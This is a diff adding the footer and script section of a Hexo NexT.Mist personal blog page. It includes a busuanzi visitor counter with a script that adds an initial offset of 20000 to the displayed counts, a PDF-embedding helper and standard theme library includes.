+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:eminemgcxwlp@gmail.com" title="E-Mail → mailto:eminemgcxwlp@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025\4\21 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kwansh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+</body>
+</html>
